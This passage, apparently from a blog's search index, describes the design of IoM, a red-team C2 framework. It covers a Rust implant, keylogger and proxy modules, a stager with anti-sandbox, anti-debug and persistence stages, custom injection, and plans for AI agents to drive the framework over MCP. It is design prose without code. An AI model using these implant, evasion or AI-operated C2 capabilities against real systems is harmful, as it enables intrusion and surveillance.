\u5c31\u53ef\u4ee5\u62d3\u5c55implant\u7684\u57fa\u7840\u80fd\u529b\uff0c\u5e76\u6309\u9700\u7ec4\u88c5</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#3rd-module","title":"3<sup>rd</sup>-module","text":"<p>\u5728v0.1.0\u7248\u672c\u4e2d\uff0c \u8fd8\u6dfb\u52a0\u4e863rd module\u30023<sup>rd</sup> module\u662f\u4f9d\u8d56\u4e8e\u5916\u90e8\u4ed3\u5e93\u5b9e\u73b0\u7684\u590d\u6742\u7684\u529f\u80fd\u7684\u6a21\u5757\uff0c \u5df2\u7ecf\u5b9e\u73b0\u7684\u4fdd\u7559 keylogger\uff0crem(\u6d41\u91cf/\u4ee3\u7406)\uff0c \u8ba1\u5212\u4e2d\u7684\u8fd8\u6709rustdesk\uff0c hvnc\uff0crdp\u7b49\u7b49\u3002 \u4e3a\u4e86\u9632\u6b62\u5927\u91cf\u5f15\u5165\u7684\u5916\u90e8\u5e93\u6c61\u67d3\u672c\u4f53\uff0c \u6240\u4ee5\u5c063rd module\u4f5c\u4e3a\u72ec\u7acb\u7684crate\u4f7f\u7528\uff0c \u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u9759\u6001\u94fe\u63a5\uff0c \u4e5f\u53ef\u4ee5\u5728\u672c\u4f53\u4e0a\u7ebf\u540e\u52a8\u6001\u52a0\u8f7d\u3002 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#prelude","title":"prelude","text":"<p>\u8fd9\u662f\u4e00\u79cd\u7279\u6b8a\u7684stager, \u53ef\u4ee5\u4f5c\u4e3a\u4e2d\u95f4\u9636\u6bb5\u7684stager\uff0c \u4e5f\u53ef\u4ee5\u4f5c\u4e3adropper\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u6b21\u6027\u7684implant\u3002 </p> <p>\u672c\u8d28\u4e0a\u662f\u5355\u7ebf\u7a0b\u6309\u9884\u914d\u7f6e\u987a\u5e8f\u6267\u884cmodule\u7684implant\u3002\u6211\u4eec\u53ef\u4ee5\u5728\u8fd9\u4e00\u9636\u6bb5\u5b9e\u73b0\u53cd\u6c99\u7bb1\u53cd\u8c03\u8bd5\uff0c\u5206\u9636\u6bb5\u4e0a\u7ebf\uff0c \u6743\u9650\u7ef4\u6301\uff0c\u81ea\u52a8\u5316\u4efb\u52a1\uff0c\u9884\u52a0\u8f7d\uff0c\u5bc6\u94a5\u5206\u53d1\uff0c\u4e0b\u8f7d\uff0c \u4e0a\u7ebf\u7b49\u7b49\u5de5\u4f5c\u3002</p> <p>\u901a\u8fc7yaml\u914d\u7f6e\u5b8c\u540e\uff0c\u80fd\u5c06yaml\u7f16\u8bd1\u4e3a\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u3002\u9762\u5bf9\u8fd9\u6837\u590d\u6742\u7684\u573a\u666f\uff0c \u5728\u4e4b\u524d\u90fd\u9700\u8981\u91cd\u65b0\u7f16\u5199\u4e00\u4e2aloader/dropper\uff0c \u800c\u73b0\u5728\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5b9e\u73b0\u5bf9\u5e94\u7684module\uff0c \u5e76\u901a\u8fc7yaml\u5373\u53ef\u5b8c\u6210\u7b80\u5355\u7684\u6309\u9700\u751f\u6210\u4e2d\u95f4\u9636\u6bb5\uff0c \u6781\u5927\u7b80\u5316\u7684\u539f\u672c\u7684\u5de5\u4f5c\u6d41\u7a0b\u3002 </p> <p>\u901a\u8fc7\u7f16\u6392module\u7684\u6267\u884c\u6d41\u7a0b\uff0c \u53ef\u4ee5\u5b9e\u73b0\u975e\u4ea4\u4e92\u5f0f\u7684\u79bb\u7ebf\u81ea\u52a8\u5316\u6d41\u7a0b, \u5d4c\u5165\u5230\u591a\u9636\u6bb5\u4e0a\u7ebf\u7684\u4efb\u610f\u6b65\u9aa4\u4e2d</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#other","title":"Other","text":"<p>\u4e0a\u9762\u63d0\u5230\u7684\u8fd9\u4e9b\u90fd\u662f\u53ea\u9700\u8981\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u8005\u7b80\u5355\u4fee\u6539\u4ee3\u7801\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u62d3\u5c55, \u4f46\u9762\u5bf9\u590d\u6742\u7684\u73b0\u5b9e\u573a\u666f\uff0c \u8fd9\u8fdc\u8fdc\u4e0d\u591f\u3002 \u5bf9\u4e8e\u80fd\u8fdb\u9636\u7684\u5f00\u53d1\u8005\uff0c\u6211\u4eec\u5b9e\u9645\u4e0a\u9884\u7559\u4e86\u66f4\u591a\u7684\u63a5\u53e3\uff0c \u53ef\u4ee5\u7b80\u5355\u66ff\u6362\u51e0\u4e2a\u51fd\u6570\uff0c \u5373\u53ef\u91cd\u8f7dmalefic\u63d0\u4f9b\u7684\u7edd\u5927\u90e8\u5206\u529f\u80fd\u3002 \u8fd9\u90e8\u5206\u7559\u7ed9\u613f\u610f\u9605\u8bfb\u4ee3\u7801\u7684\u670b\u53cb</p> <ul> <li>\u81ea\u5b9a\u4e49\u52a0\u5bc6\u65b9\u5f0f</li> <li>\u81ea\u5b9a\u4e49\u4f20\u8f93\u5c42</li> <li>\u81ea\u5b9a\u4e49\u8fdb\u7a0b\u6ce8\u5165\u65b9\u5f0f</li> <li>\u66ff\u6362\u5f02\u6b65\u8fd0\u884c\u65f6</li> <li>\u81ea\u5b9a\u4e49stager\u4e0a\u7ebf, \u52a0\u5bc6\uff0c \u52a0\u8f7d\u5b9e\u73b0</li> <li>\u6dfb\u52a0server rpc\u63a5\u53e3</li> <li>\u6dfb\u52a0client command</li> <li>\u6dfb\u52a0mals function</li> <li>......</li> </ul>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#\u8054\u52a8","title":"\u8054\u52a8","text":"<p>\u6211\u4eec\u66f4\u5e0c\u671b\u5f62\u6210\u4e00\u4e2a\u8fdb\u653b\u6027\u5b89\u5168\u7684\u751f\u6001\uff0c\u800c\u4e0d\u662f\u7eaf\u7cb9\u7684\u6b66\u5668\u3002\u8fd9\u4e5f\u662f\u6211\u4eec\u7559\u4e0b\u5982\u6b64\u591a\u7684\u62d3\u5c55\u7ef4\u5ea6\u7684\u539f\u56e0\u3002 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#with-redteaming","title":"With RedTeaming","text":"<p>IoM\u5728\u6700\u521d\u8bbe\u60f3\u4e2d\uff0c \u5c31\u662f\u7528\u6765\u5f25\u8865CobaltStrike\u7684\u9057\u61be\uff0c \u6240\u4ee5\u5728\u57fa\u672c\u529f\u80fd\u548c\u53c2\u6570\u4e0a\u90fd\u662f\u4ee5CobaltStrike\u4f5c\u4e3a\u6807\u51c6\u53bb\u5b9e\u73b0\u7684\uff0c CobaltStrike\u5df2\u7ecf\u6709\u7684\uff0c \u6211\u4eec\u90fd\u5c3d\u53ef\u80fd\u5b9e\u73b0\u4e86\u76f8\u4f3c\u7684\u529f\u80fd\uff0c \u5e76\u4fdd\u7559\u4e86\u76f8\u4f3c\u7684\u63a5\u53e3\u4e0e\u7528\u6cd5\u3002 \u751a\u81f3\u5f88\u591a\u7406\u5e94\u88ab\u6dd8\u6c70\u7684\u6280\u672f\uff0c\u56e0\u4e3aCobaltStrike\u5e76\u6ca1\u6709\u5220\u9664\uff0c \u4e5f\u8fdb\u884c\u4e86\u91cd\u65b0\u5b9e\u73b0\u3002 \u76ee\u524d\u6765\u770b\uff0c \u5728\u7a33\u5b9a\u6027\u4e0e\u7528\u6237\u4f53\u9a8c\u4e0a\u786e\u5b9e\u65e0\u6cd5\u4e0eCobltStrike\u5bf9\u6807\uff0c \u4f46\u662f\u5728\u529f\u80fd\u4e0eOPSEC\u4e0a\u5df2\u7ecf\u4e0e\u5176\u76f8\u5f53\u751a\u81f3\u90e8\u5206\u8d85\u8d8a\u3002 </p> <p>\u6240\u4ee5v0.1.0\u7248\u672c\u53d1\u5e03\u540e\uff0cIoM\u5df2\u7ecf\u8db3\u591f\u4f5c\u4e3a\u90e8\u5206\u573a\u666f\u4e0b\u7684CobaltStrike\u7684\u4ee3\u66ff\uff0c\u80fd\u5728\u4e00\u4e9bReadTeaming\u884c\u52a8\u4e2d\u51fa\u73b0\u4e86\uff0c \u5e76\u4e14\u6211\u4eec\u4e5f\u8fdb\u884c\u4e86\u591a\u6b21\u5b9e\u6218\uff0c\u53d1\u73b0\u4e86\u4e0d\u5c11\u95ee\u9898\u5e76\u4e0d\u65ad\u6539\u8fdb\u81ea\u8eab\u3002 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#with-bas","title":"With BAS","text":"<p>\u6bd4\u8d77sliver\uff0c CoblatStrike\uff0c Havoc\uff0c\u8fd8\u6709nighthawk\uff0cbrc4\u4e4b\u7c7b\u7684\u6846\u67b6\uff0c IoM\u6700\u5927\u7684\u4f18\u52bf\u5c31\u662f\u5176\u4e30\u5bcc\u7684\u53ef\u62d3\u5c55\u63a5\u53e3\u3002\u6211\u4eec\u4e5f\u5e0c\u671b\u6210\u4e3aBAS\u7684\u57fa\u7840\u8bbe\u65bd\uff0c \u63d0\u4f9bpost-exploit\u90e8\u5206\u7684\u5143\u80fd\u529b\u3002 </p> <p>\u8fd1\u671f\u8c03\u7814\u4e86\u591a\u5bb6BAS\u4ea7\u54c1\uff0c\u6211\u53d1\u73b0\u67d0\u4e9b\u5382\u5546\u7684BAS\u95ee\u9898\u5728\u4e8e\u5c06playbook\u4f5c\u4e3a\u5176\u6838\u5fc3\u80fd\u529b\u4e0e\u5356\u70b9\uff0c\u4e0d\u5c11\u4ea7\u54c1\u7684\u57fa\u4e8e\u6d41\u91cf\u91cd\u653e\u6216\u8005\u56fa\u5b9a\u7684\u653b\u51fb\u811a\u672c\u5b9e\u73b0\u5176\u6838\u5fc3\u80fd\u529b\u3002 \u76f4\u63a5\u5bfc\u81f4\u4e86\u5728\u5bf9\u63a5ATT&amp;CK\u65f6\uff0c \u5c06TTP\u4f5c\u4e3a\u7ed3\u679c\u800c\u4e0d\u662f\u8fc7\u7a0b\u3002 \u5728\u5546\u4e1a\u89d2\u5ea6\u4e0a\u4e0d\u8bc4\u8bba\u5176\u4f18\u52a3\uff0c \u4f46\u5728\u6280\u672f\u5b9e\u73b0\u4e0a\u662f\u7f3a\u4e4f\u8010\u5fc3\u7684\u3002</p> <p>IoM\u7684\u67b6\u6784\u5f88\u9002\u5408\u4f5c\u4e3aBAS\u7684\u57fa\u7840\u80fd\u529b\u7684\u4e00\u90e8\u5206\uff0c\u63d0\u4f9b\u5927\u91cf\u7684\u5143\u80fd\u529b\u4ee5\u53ca\u5feb\u901f\u7ec4\u5408\u5143\u80fd\u529b\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#with-asm","title":"With ASM","text":"<p>\u5728chainreactors\u7684\u8ba1\u5212\u4e2d\uff0c\u6211\u4eec\u4e5f\u6709\u4e00\u4e2a\u5e9e\u5927\u7684ASM\u7684\u8bbe\u8ba1\uff0c \u5e76\u4e14\u5b9e\u73b0\u4e86\u4e00\u4e2ademo\u3002 \u5176\u4e2d\u4e00\u4e2a\u6838\u5fc3\u8bbe\u8ba1\u5c31\u662f\u5c06rem(\u6d41\u91cf\u4ee3\u7406)\u5de5\u5177\u4f5c\u4e3a\u8054\u901aASM\u4e0eC2\u7684\u6865\u6881\uff0c\u5c06EASM(\u4e3b\u8981\u5173\u6ce8\u5916\u90e8\u8d44\u4ea7)\u62d3\u5c55\u4e3aCAASM(\u4e3b\u8981\u5173\u6ce8\u5185\u90e8\u8d44\u4ea7)\u6210\u4e3a\u5b8c\u6574\u7684ASM\uff0c\u5f53\u7136\u8fd9\u90fd\u662f\u7ad9\u5728\u653b\u51fb\u6a21\u62df/\u81ea\u52a8\u5316\u653b\u51fb\u89c6\u89d2\u7684\uff0c \u8fd9\u6837\u7684\u5b9e\u73b0\u65b9\u5f0f\u5e76\u4e0d\u4e00\u5b9a\u9002\u5408\u7532\u65b9\u5b89\u5168\u5efa\u8bbe\u3002</p> <p>\u5c06IoM\u7684implant\u4f5c\u4e3aCAASM\u7684agent, \u5728\u76ee\u6807\u5185\u7f51\u8fdb\u884c\u81ea\u52a8\u5316\u7684\u63a2\u6d4b\uff0c\u4ea4\u4e92\uff0c \u6570\u636e\u6c47\u603b\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#with-ai","title":"With  AI","text":"<p>AI\u5df2\u7ecf\u5b8c\u5168\u878d\u5165\u4e86IoM\u5f00\u53d1\u7684\u5de5\u4f5c\u6d41\u4e2d\uff0c \u5728\u957f\u671f\u7684\u4f7f\u7528\u4e2d\u80fd\u5f88\u8f7b\u6613\u7684\u53d1\u73b0\uff0c \u8981\u8ba9AI\u4ece\u96f6\u53bb\u505a\u67d0\u4e2a\u4e8b\u60c5\uff0c \u5f80\u5f80\u9700\u8981\u5927\u91cf\u7684\u5bf9\u8bdd\uff0c \u4f46\u662f\u5982\u679c\u5df2\u7ecf\u6709\u4e00\u5957\u76f8\u5bf9\u6210\u719f\u7684\u6846\u67b6\uff0c \u8ba9AI\u53bb\u586b\u5145\u5185\u5b58\uff0c AI\u80fd\u5b8c\u6210\u5f97\u975e\u5e38\u597d\u3002 \u800c\u73b0\u5728IoM\u63d0\u4f9b\u4e86\u597d\u51e0\u5957\u53ef\u62d3\u5c55\u7684\u63a5\u53e3\uff0c\u4ee5\u53ca\u4e00\u4e2a\u5f00\u53d1\u6846\u67b6\u3002 \u5f53\u6211\u5c1d\u8bd5\u8ba9AI\u53bb\u7f16\u5199\u63d2\u4ef6\u6216\u8005\u63a7\u5236IoM\u5b8c\u6210\u4efb\u52a1\u65f6\uff0c AI\u8868\u73b0\u51fa\u4e86\u8d85\u8fc7\u5927\u90e8\u5206\u4eba\u7c7b\u7684\u80fd\u529b\u3002 </p> <p>\u6211\u4eec\u6b63\u5728\u63a2\u7d22\u901a\u8fc7\u63d0\u4f9b\u4e0d\u540c\u573a\u666f\u7684prompt\uff0c \u57fa\u4e8e\u6211\u4eec\u7684vscode\u7684GUI\u63d2\u4ef6\uff0c\u76f4\u63a5\u63a7\u5236IoM\u4ee3\u66ff\u4eba\u7c7b\u53bb\u5b8c\u6210\u4efb\u52a1\u3002</p> <p>\u5728\u5199\u8fd9\u7bc7\u6587\u7ae0\u7684\u8fc7\u7a0b\u4e2d\uff0c\u8bde\u751f\u4e86\u4e00\u4e2a\u6781\u5927\u7b80\u5316AI agent\u5b9e\u73b0\u7684MCP\u534f\u8bae\u3002 \u6211\u4eec\u53d1\u73b0\u4e0d\u518d\u9700\u8981\u901a\u8fc7prompt\u6765\u6559\u4f1aAI\uff0c \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7MCP\u534f\u8bae</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E4%BB%8E%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E7%9A%84%E8%A7%92%E5%BA%A6%E9%87%8D%E6%96%B0%E8%AE%BE%E8%AE%A1C2%E6%A1%86%E6%9E%B6%20Part1/#\u5c0f\u7ed3","title":"\u5c0f\u7ed3","text":"<p>\u5728IoM\u4e2d, client/server/listener/implant \u56db\u7aef\u51e0\u4e4e\u662f\u5b8c\u5168\u89e3\u8026\u7684, \u53ef\u4ee5\u5728\u4efb\u610f\u4e00\u7aef\u63d2\u5165\u7528\u6237\u81ea\u5df1\u7f16\u5199\u7684\u5b9e\u73b0. \u800c\u4e0d\u5f71\u54cd\u5230\u5176\u4ed6\u7ec4\u4ef6\u7684\u5de5\u4f5c, \u6211\u4eec\u901a\u8fc7\u7ea6\u5b9a\u7edf\u4e00\u7684\u89c4\u8303\u6765\u517c\u5bb9\u5c3d\u53ef\u80fd\u591a\u7684\u751f\u6001\u4e0e\u793e\u533a. </p> <p>\u5728\u672c\u6587\u53d1\u5e03\u7684\u540c\u65f6, \u4e5f\u4f1a\u5c1d\u8bd5\u9080\u8bf7\u4e00\u4e9b\u5f00\u53d1\u8005\u4e0eIoM\u8fdb\u884c\u5bf9\u63a5, \u5171\u540c\u5efa\u8bbe.</p> <p>\u73b0\u5728\u7684IoM\u5c1d\u8bd5\u5b9e\u73b0\u4ee3\u66ffCobaltStrike\u7684\u51c6\u5907\uff0c\u671d\u7740\u8fd9\u4e00\u76ee\u6807\u524d\u8fdb\u3002</p> <p>CobaltStrike \u7559\u7ed9\u7528\u6237\u53ef\u66f4\u6539\u7684\u63a5\u53e3\u5f88\u591a:</p> <ul> <li>\u57fa\u4e8esleep\u8bed\u8a00\u7684Aggressive Script, \u80fd\u901a\u8fc7\u811a\u672c\u8c03\u7528\u7edd\u5927\u90e8\u5206implant\u7684\u529f\u80fd\u4ee5\u53ca\u5bf9ui\u7684\u52a8\u6001\u62d3\u5c55;</li> <li>\u901a\u8fc7profile\u5b9e\u73b0\u7684\u5bf9\u6d41\u91cf\u7279\u5f81\u5df2\u7ecf\u90e8\u5206\u52a8\u6001\u7279\u5f81\u7684\u81ea\u5b9a\u4e49</li> <li>arsenal kit\u4e2d\u63d0\u4f9b\u7684sleepmask\uff0c artifact\uff0c udrl\uff0cresource \u7b49\u5bf9CS\u5168\u5c40\u7684\u529f\u80fd\u66ff\u6362\uff0c \u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684OPSEC</li> </ul> <p>\u8981\u5b9e\u73b0\u5bf9CobaltStrike\u7684\u5b8c\u5168\u66ff\u6362\uff0c \u4e0d\u53ef\u907f\u514d\u5f97\u5b9e\u73b0\u4e0a\u8bc9\u6240\u6709\u529f\u80fd\u3002</p> <p>\u8fd9\u662f\u4e2a\u5e9e\u5927\u7684\u5de5\u7a0b\uff0c \u76ee\u524dIoM\u80fd\u505a\u5230CS\u5927\u90e8\u5206\u62d3\u5c55\u529f\u80fd\u7684\u7b49\u4ef7\u66ff\u6362\uff0c \u4f46\u786e\u5b9e\u5728\u4e0d\u5c11\u7ec6\u8282\u4e0a\u65e0\u6cd5\u5b8c\u5168\u5b9e\u73b0\u3002 </p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/","title":"IoM\u8bbe\u8ba101   \u8bbe\u8ba1\u4e00\u4e2a\u5904\u5904\u53ef\u62d3\u5c55\u7684C2\u6846\u67b6","text":"<p>IoM \u8bbe\u8ba1\u7cfb\u5217\u4e3b\u8981\u95f2\u8bddIoM\u7684\u8bbe\u8ba1\u7406\u5ff5\uff0c\u6280\u672f\u9009\u578b\uff0c \u5bf9\u793e\u533a\u3001\u73af\u5883\u3001\u672a\u6765\u7684\u601d\u8003\u7b49\u3002 \u4e5f\u8bb8\u80fd\u7ed9\u505a\u540c\u6837\u4e8b\u60c5\u7684\u670b\u53cb\u5e26\u6765\u4e00\u4e9b\u4e0d\u4e00\u6837\u7684\u60f3\u6cd5\u3002 \u4e0e\u8fdb\u9636\u7cfb\u5217\u4e0d\u540c\u7684\u662f\uff0c \u8bbe\u8ba1\u7cfb\u5217\u4e0d\u4f1a\u6709\u592a\u591a\u7684\u4ee3\u7801\uff0c\u4f46\u8fd9\u5e76\u4e0d\u610f\u5473\u7740\u4fe1\u606f\u91cf\u964d\u4f4e :)</p> <p>\u6f84\u6e05\u4e00\u4e2a\u8bef\u4f1a\uff0c \u5f88\u591a\u670b\u53cb\u4ee5\u4e3aIoM\u51e0\u6b21\u66f4\u65b0\u516c\u544a\u4e2d\u63d0\u5230\u7684\u529f\u80fd\u53ea\u5728 Professional\u7248\u672c\u4e2d\u53ef\u4ee5\u4f7f\u7528\uff0c \u4f46\u5b9e\u9645\u4e0a\u9664\u4e86\u6781\u5c11\u6570</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u6211\u4eec\u4e3a\u4ec0\u4e48\u60f3\u8981\u81ea\u5df1\u5b9e\u73b0\u4e00\u4e2aC2 Framework, \u5176\u4e2d\u6709\u5bf9CobaltStrike\u6280\u672f\u8def\u7ebf\u4e0d\u591f\u6ee1\u610f\uff0c\u53c8\u65e0\u5948\u4e0e\u65e0\u6cd5\u5728\u5f00\u6e90\u793e\u533a\u4e2d\u627e\u5230\u4e00\u4e2a\u8db3\u591f\u6210\u719f\u7684C2\u4ee3\u66ff\uff0c\u66f4\u662f\u8ba1\u5212\u7528\u65b0\u7684\u6280\u672f\u8def\u7ebf\u53bb\u5c1d\u8bd5\u65b0\u7684\u60f3\u6cd5\u3002 </p> <p>\u4e5f\u56e0\u6b64**IoM\u5728\u6280\u672f\u9009\u578b\u4e0a\u4f1a\u76f8\u5bf9\u6fc0\u8fdb,** \u6211\u4eec\u5c1d\u8bd5\u91c7\u7528golang(client/server/listener) + rust(implant) \u4f5c\u4e3a\u57fa\u8c03\uff0c \u5e76\u4ee5\u6b64\u4e3a\u57fa\u7840\u5c1d\u8bd5\u91cd\u65b0\u5b9e\u73b0\u5f00\u6e90\u793e\u533a\u4e2d\u5b58\u5728\u7684\u5df2\u6709\u7684\u4e00\u5207\u6280\u672f\uff08\u53ea\u4ee3\u8868\u5927\u81f4\u8def\u7ebf\uff0c\u6211\u4eec\u5f53\u7136\u6ca1\u6709\u80fd\u529b\u53bb\u5b9e\u73b0\u6240\u6709\u6280\u672f\uff09\u3002</p> <p>\u6211\u4eec\u7684server/client \u91c7\u7528\u4e86\u7c7b\u4f3csliver\u7c7b\u4f3c\u7684\u8f6f\u4ef6\u67b6\u6784, grpc + repl(\u4ea4\u4e92\u5f0f\u547d\u4ee4\u884c) , \u5728\u65e9\u671f\u7248\u672c\u4e2d(v0.0.1)\uff0c \u4e5f\u590d\u7528\u4e86\u4e0d\u5c11sliver\u7684\u4ee3\u7801\uff0c \u4f46\u5728\u540e\u7eed\u7684\u66f4\u65b0\u4e2d\u6e90\u81easliver\u7684\u51e0\u4e4e\u6240\u6709\u4ee3\u7801\u90fd\u5df2\u7ecf\u88ab\u91cd\u6784\uff0c \u53ea\u8fd8\u4fdd\u7559\u7740\u6709\u4e00\u4e9b\u7c7b\u4f3c\u7684\u8f6f\u4ef6\u67b6\u6784\u3002 </p> <p>\u800c\u5728listener\u4e0a\uff0c \u6211\u4eec\u4e00\u5f00\u59cb\u5c31\u5c06\u5176\u4eceserver\u4e2d\u89e3\u8026\u51fa\u6765\uff0c listener\u968f\u7740\u66f4\u65b0\u4f1a\u8d8a\u6765\u8d8a\u6765\u81ea\u7531\uff0c\u6700\u7ec8\u76ee\u7684\u662f\u5728\u4efb\u4f55\u5b58\u5728\u6570\u636e\u4ea4\u6362\u7684\u5730\u65b9\u6784\u5efa(\u548crem\u7684\u8bbe\u8ba1\u7406\u5ff5\u4e00\u81f4, \u5b9e\u9645\u4e0a\u4e5f\u4f9d\u8d56rem\u5b9e\u73b0)\u3002</p> <p>\u6700\u5173\u952e\u7684implant\u5219\u9009\u7528\u4e86rust\uff0c \u4e0d\u5f97\u4e0d\u8bf4\uff0c \u8fd9\u4e2a\u51b3\u5b9a\u8ba9\u6211\u4eec\u8e29\u4e86\u65e0\u6570\u5751\u3002\u76ee\u524d\u770b\u6765\u786e\u5b9e\u6ca1\u6709\u6bd4rust\u66f4\u597d\u7684\u9009\u62e9\uff0c \u4f46\u8fd9\u5e76\u4e0d\u4ee3\u8868rust\u80fd\u5b8c\u5168\u80dc\u4efb\u6211\u4eec\u7684\u9700\u6c42\u3002rust\u7ed9\u6211\u4eec\u5e26\u6765\u7684\u9ebb\u70e6\u5305\u62ec \u7f16\u8bd1\u73af\u5883\uff0c \u7f16\u8bd1\uff0c \u94fe\u63a5\uff0c \u751f\u6210\u7684target\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f9d\u8d56\uff0c \u517c\u5bb9\u6027\u7b49\u7b49\u95ee\u9898\u3002 \u8fd9\u91cc\u9762\u6709\u975e\u5e38\u591a\u7684\u95ee\u9898\u4e0d\u662f\u6211\u4eec\u4f7f\u7528\u4e0a\u7684\u95ee\u9898\uff0c \u591a\u534a\u81ea\u4e8erust\u81ea\u8eab\u7684bug, \u8bbe\u8ba1\u3002 \u5728\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u7684\u8fc7\u7a0b\u4e2d\uff0c \u6211\u4eec\u5c06\u4e00\u90e8\u5206\u5185\u5bb9\u6574\u7406\u6210\u4e86IoM\u8fdb\u9636\u7cfb\u5217\uff0c \u4e5f\u5c31\u662f\u524d\u51e0\u5929\u53d1\u7684 <code>PE Loader/RDI\u7684TLS\u4e4b\u6b87</code>\u3002\u800c\u548c\u8fd9\u4e2a\u95ee\u9898\u5dee\u4e0d\u591a\u62bd\u8c61\u7684\u95ee\u9898\uff0c \u5927\u6982\u8fd8\u670910\u4e2a (\u5f53\u7136\u4e5f\u6709\u529e\u6cd5\u7ed5\u8fc7\u6216\u8005\u653e\u5f03\u4e00\u90e8\u5206\u80fd\u529b\uff0c\u4f46\u662f\u8fd9\u4e48\u505a\u4e0b\u53bb\u5c31\u53d8\u6210\u5c31\u53d8\u5f97\u65e0\u8da3\u4e86)\u3002</p>"},{"location":"blog/todo/IoM%E8%AE%BE%E8%AE%A101---%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E5%A4%84%E5%A4%84%E5%8F%AF%E6%8B%93%E5%B1%95%E7%9A%84C2%E6%A1%86%E6%9E%B6/#\u603b\u89c8","title":"\u603b\u89c8","text":"<p>\u76ee\u524d\u7684IoM\u7684\u901a\u8baf\u67b6\u6784</p> <ul> <li>client&lt;-&gt;server \u4ea4\u4e92\u901a\u8fc7grpc\u5b9e\u73b0</li> <li>server\u4e0elistener\u5219\u901a\u8fc7\u7edf\u4e00\u7684\u6570\u636e\u5305\u534f\u8bae<code>Spite</code>(protobuf\u7684message)\u4ea4\u4e92. </li> <li>listener\u4e0emalefic(malefic\u53ea\u662fimplant\u7684\u4e00\u4e2a\u5177\u4f53\u5b9e\u73b0)\u901a\u8fc7parser\u5c06\u6570\u636e\u89e3\u6790\u4e3a<code>Spite</code></li> </ul> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662flistener\u4e0a\u53ef\u4ee5\u6839\u636eparser\u5207\u6362\u4e0d\u540c\u7684implant\u534f\u8bae\u3002 client/server/listener\u4e4b\u95f4\u7684\u4ea4\u4e92\u7edf\u4e00\u4f7f\u7528\u540c\u4e00\u4e2aprotobuf \u5b9a\u4e49\u3002 </p> <p>\u5bf9\u4e8e\u62d3\u5c55\u6027\u6765\u8bf4\uff0c \u4e3b\u8981\u5728\u8fd9\u56db\u4e2a\u5730\u65b9\u8fdb\u884c\u62d3\u5c55</p> <ul> <li>Client\u7aef\u63d2\u4ef6\u811a\u672c\u8bed\u8a00\u548cCommand</li> <li>Server\u7aefrpc</li> <li>Listener\u7684Pipeline\u548cParser</li> <li>Implant\u7aef\u7684module, kits, 3<sup>rd</sup>-module</li> </ul> <p>\u5728\u7528\u6237\u770b\u6765, \u6700\u7ec8\u4f7f\u7528\u4f53\u9a8c\u4f1aCS\u7684aggressor script\u76f8\u4f3c\uff0c 